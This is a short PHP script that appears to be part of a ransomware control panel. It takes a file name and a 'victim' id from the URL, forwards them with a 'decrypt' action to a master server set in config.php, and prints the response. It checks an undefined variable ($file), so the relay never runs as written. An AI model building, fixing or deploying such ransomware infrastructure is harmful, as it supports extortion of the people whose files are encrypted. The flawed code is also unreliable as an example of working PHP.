<?php

include('config.php');

$filename = $_GET['file'];
$victim = $_GET['id'];

if(!empty($file) && !empty($victim)) {
	$data = "file={$filename}&id={$victim}&act=decrypt";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $MASTER_URL);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT,30);
	curl_setopt($ch, CURLOPT_POST, 1);
	$view = curl_exec($ch);
	curl_close($ch);

	echo $view;
}

?>